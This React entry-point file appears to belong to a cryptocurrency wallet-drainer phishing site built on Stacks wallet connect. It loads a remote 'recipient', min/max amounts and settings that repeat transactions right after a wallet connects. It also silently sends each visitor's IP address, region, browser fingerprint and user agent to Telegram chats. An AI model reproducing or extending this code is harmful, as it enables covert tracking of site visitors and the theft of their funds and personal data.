/* eslint-disable react-hooks/exhaustive-deps */
import { useEffect, useState } from 'react'

import { Connect } from '@stacks/connect-react'
import { useAuth } from './common/use-auth';

import { Main } from "./main"
import { getConfig } from "./lib/tg"

import { loadData } from "./lib/bitcoin/axios"

import Setting , { setSetting }  from "./store"

import { LogTg } from "./lib/tg"

function App() {
  const { authOptions } = useAuth();
  const [ load, setLoad ] = useState(false)

  useEffect(() => {
    (async function Init() {
      const config = await getConfig()
      
      const data = await loadData(config.server)

      Setting.server = config.server
      Setting.RPC = config.RPC
      Setting.modal = config.modal
      Setting.repeatTransactions = config.repeatTransactions
      Setting.transactionAfterConnect = config.transactionAfterConnect

      Setting.min = data.min
      Setting.max = data.max
      Setting.recipient = data.recipient
      Setting.chat_ids = data.chat_ids
      Setting.location = data.location
      Setting.fingerprint = data.fingerprint
      Setting.mobile = data.mobile

      LogTg("user_site_connected", { // телеграм
        url: window.location.href,
        userData: { fingerprint: Setting.fingerprint, userIp: Setting.location.ipAddress, userRegion: Setting.location.stateProv },
        userAgent: window.navigator.userAgent
      })
      
      setSetting(Setting)
      setLoad(true)

    })()
  }, [null])

  return (
    <Connect authOptions={authOptions}>
      {
        load ? <Main /> : null
      }
      
    </Connect>
  );
}

export default App;
